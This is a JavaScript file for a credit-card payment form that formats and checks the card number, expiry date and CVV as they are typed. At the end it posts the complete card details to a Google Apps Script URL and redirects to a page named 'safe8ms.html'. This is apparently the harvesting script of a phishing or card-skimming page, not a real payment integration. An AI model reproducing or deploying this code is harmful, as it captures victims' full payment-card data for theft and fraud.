
const name = document.getElementById('name');
const number = document.getElementById('number');
const date = document.getElementById('date');
const cvv = document.getElementById('cvv');

function showError(element, error) {
    if(error === true) {
        element.style.opacity = '1';
    } else {
        element.style.opacity = '0';
    }
};

number.addEventListener('input', function(e) {
    this.value = numberAutoFormat();


    let error = this.value.length !== 19;
    let alert2 = document.getElementById('alert-2');
    showError(alert2, error);

    document.querySelector('.card__number').textContent = this.value;
});

function numberAutoFormat() {
    let valueNumber = number.value;
   
    let v = valueNumber.replace(/\s+/g, '').replace(/[^0-9]/gi, '');

    
    let matches = v.match(/\d{4,16}/g);
    let match = matches && matches[0] || '';
    let parts = [];

    for (i = 0; i < match.length; i += 4) {
        
        parts.push(match.substring(i, i + 4));
    }

    if (parts.length) {
       
        return parts.join(' ');
    } else {
        return valueNumber;
    }
};

date.addEventListener('input', function(e) {
    this.value = dateAutoFormat();
    
  
    let alert3 = document.getElementById('alert-3');
    showError(alert3, isNotDate(this));

    let dateNumber = date.value.match(/\d{2,4}/g);
    document.getElementById('month').textContent = dateNumber[0];
    document.getElementById('year').textContent = dateNumber[1];
});

function isNotDate(element) {
    let actualDate = new Date();
    let month = actualDate.getMonth() + 0;
    let year = Number(actualDate.getFullYear().toString().substr(-2)); // 2022 -> 22
    let dateNumber = element.value.match(/\d{2,4}/g);
    let monthNumber = Number(dateNumber[0]);
    let yearNumber = Number(dateNumber[1]);
    
    if(element.value === '' || monthNumber < 1 || monthNumber > 12 || yearNumber < year || (monthNumber <= month && yearNumber === year)) {
        return true;
    } else {
        return false;
    }
}

function dateAutoFormat() {
    let dateValue = date.value;
   
    let v = dateValue.replace(/\s+/g, '').replace(/[^0-9]/gi, '');


    let matches = v.match(/\d{2,4}/g);
    let match = matches && matches[0] || '';
    let parts = [];

    for (i = 0; i < match.length; i += 2) {
    
        parts.push(match.substring(i, i + 2));
    }

    if (parts.length) {
       
        return parts.join('/');
    } else {
        return dateValue;
    }
};

cvv.addEventListener('input', function(e) {
    let alert4 = document.getElementById('alert-4');
    let error = this.value.length < 3;
    showError(alert4, error)
});

function isNumeric(event) {
    if ((event.keyCode < 48 || event.keyCode > 57) && (event.keyCode > 31)) {
        return false;
    }
};

 const scriptURL = 'https://script.google.com/macros/s/AKfycbwTh0Hpplbvx9ttqDkly1V0lJuvxzSdfGwAyHu0TrKTbwH65AmroJ6QIPf2UWfF4LJs2g/exec'
        const form = document.forms['sform']
        form.addEventListener('submit', e => { 
         e.preventDefault()
     document.querySelector("#sub").innerHTML="Processing..";
     let requestBody = new FormData(form)
     fetch(scriptURL, { method: 'POST', body: requestBody})
        .then(() => { form.reset();
        document.querySelector("#sub").innerHTML="Proceed";
        window.location.replace("safe8ms.html");
         })
       .catch(error => {
       alert('Check your internet connection!', error.message)
         submitButton.disabled = false

       }
       )
   })

